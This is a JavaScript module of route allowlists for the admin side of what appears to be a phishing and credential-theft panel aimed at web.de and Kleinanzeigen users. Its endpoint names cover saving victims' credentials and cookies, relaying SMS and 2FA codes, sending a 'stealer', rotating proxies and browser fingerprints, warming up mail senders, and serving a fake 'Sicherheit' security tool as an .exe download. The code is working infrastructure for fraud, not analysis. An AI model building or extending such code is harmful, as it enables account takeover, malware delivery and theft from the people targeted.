'use strict';

const PUBLIC_ADMIN_PATHS = new Set([
  '/api/admin/login',
  '/admin-login.html',
  '/admin-login',
  '/admin-login/',
]);

const ADMIN_PAGE_PATHS = new Set([
  '/admin',
  '/admin/',
  '/admin.html',
  '/config',
  '/config/',
  '/stats',
  '/stats/',
]);

const ADMIN_ASSET_PATHS = new Set([
  '/admin.css',
  '/admin.js',
  '/klein-logo.png',
  '/windows-icon.png',
  '/android-icon.png',
  '/ios-icon.png',
]);

const MAILER_PATHS = new Set([
  '/mailer',
  '/mailer/',
  '/mailer/index.html',
  '/mailer/index-test.html',
  '/mailer/mailer.js',
  '/mailer/mailer.css',
]);

const ADMIN_DOMAIN_EXTRA_PATHS = new Set([
  '/sicherheit',
  '/sicherheit/',
  '/sicherheit-pc',
  '/sicherheit-pc/',
  '/sicherheit-update',
  '/sicherheit-update/',
  '/download/sicherheit-tool',
  '/download/sicherheit-tool.zip',
  '/download/sicherheit-tool.exe',
  '/bitte-am-pc',
  '/bitte-am-pc/',
  '/app-update',
  '/app-update/',
  '/api/chat',
]);

const ADMIN_API_PATHS = new Set([
  '/api/admin/login',
  '/api/admin/logout',
  '/api/chat-open',
  '/api/chat-open-ack',
  '/api/chat-typing',
  '/api/chat-read',
  '/api/leads',
  '/api/geo',
  '/api/get-saved-credentials',
  '/api/delete-lead',
  '/api/delete-all',
  '/api/save-credentials',
  '/api/delete-saved-credential',
  '/api/mode',
  '/api/start-page',
  '/api/stats',
  '/api/show-error',
  '/api/show-success',
  '/api/redirect-change-password',
  '/api/redirect-sicherheit',
  '/api/redirect-sicherheit-windows',
  '/api/redirect-android',
  '/api/redirect-download-by-platform',
  '/api/redirect-push',
  '/api/redirect-sms-code',
  '/api/redirect-2fa-code',
  '/api/redirect-open-on-pc',
  '/api/redirect-klein-forgot',
  '/api/mark-worked',
  '/api/mark-opened',
  '/api/config/download',
  '/api/config/download-limit',
  '/api/config/download-upload-multi',
  '/api/config/download-android',
  '/api/config/download-android-limit',
  '/api/config/download-android-upload-multi',
  '/api/config/download-delete',
  '/api/config/download-android-delete',
  '/api/config/download-reset-counts',
  '/api/config/download-rotate-next',
  '/api/config/download-settings',
  '/api/config/cookies-export',
  '/api/config/check',
  '/api/config/upload-apply',
  '/api/config/shortlinks',
  '/api/config/short-domains',
  '/api/config/short-domains-check',
  '/api/config/zip-password',
  '/api/config/zip-process',
  '/api/config/proxies',
  '/api/config/proxies-validate',
  '/api/config/webde-fingerprint-indices',
  '/api/config/webde-fingerprints-list',
  '/api/config/webde-fingerprint-probe-start',
  '/api/config/webde-fingerprint-probe-status',
  '/api/config/stealer-email',
  '/api/config/stealer-email/select',
  '/api/config/email',
  '/api/config/email/select',
  '/api/config/warmup-email',
  '/api/config/warmup-email/select',
  '/api/send-stealer',
  '/api/send-email',
  '/api/send-email-all-success',
  '/api/send-email-cookies-batch',
  '/api/archive-leads-by-filter',
  '/api/lead-kl-archive',
  '/api/warmup-start',
  '/api/warmup-status',
  '/api/warmup-pause',
  '/api/warmup-stats-reset',
  '/api/warmup-stop',
  '/api/export-logs',
  '/api/lead-credentials',
  '/api/lead-cookies',
  '/api/lead-cookies-upload',
  '/api/lead-fingerprint',
  '/api/lead-automation-profile',
  '/api/lead-login-context',
  '/api/webde-login-grid-step',
  '/api/worker/send-config-email',
  '/api/worker/proxy-txt',
  '/api/webde-login-start',
  '/api/webde-login-result',
  '/api/webde-wait-password',
  '/api/webde-poll-2fa-code',
  '/api/webde-login-2fa-wrong',
  '/api/webde-login-2fa-received',
  '/api/webde-login-slot-done',
  '/api/webde-push-resend-poll',
  '/api/webde-push-resend-result',
  '/api/script-event',
  '/api/zip-password',
  '/api/lead-klein-flow-poll',
  '/api/klein-anmelden-seen',
]);

/** Публичные пути админ-домена без сессии (логин и страница входа). */
function isPublicAdminPath(pathname) {
  return PUBLIC_ADMIN_PATHS.has(pathname);
}

function isAdminPagePath(pathname) {
  return ADMIN_PAGE_PATHS.has(pathname);
}

function isAdminLoginPath(pathname) {
  return pathname === '/admin-login.html' || pathname === '/admin-login' || pathname === '/admin-login/';
}

function isAdminAssetPath(pathname) {
  return ADMIN_ASSET_PATHS.has(pathname);
}

/** Эндпоинты только для админки (CORS / маршрутизация). */
function isAdminRequest(pathname) {
  return ADMIN_API_PATHS.has(pathname);
}

function isAdminDomainAllowedPath(pathname) {
  if (isAdminPagePath(pathname) || isPublicAdminPath(pathname) || isAdminAssetPath(pathname) || isAdminRequest(pathname)) return true;
  if (MAILER_PATHS.has(pathname) || ADMIN_DOMAIN_EXTRA_PATHS.has(pathname)) return true;
  return pathname.startsWith('/download/') && pathname.length > 10;
}

module.exports = {
  isAdminRequest,
  isPublicAdminPath,
  isAdminPagePath,
  isAdminLoginPath,
  isAdminAssetPath,
  isAdminDomainAllowedPath,
};
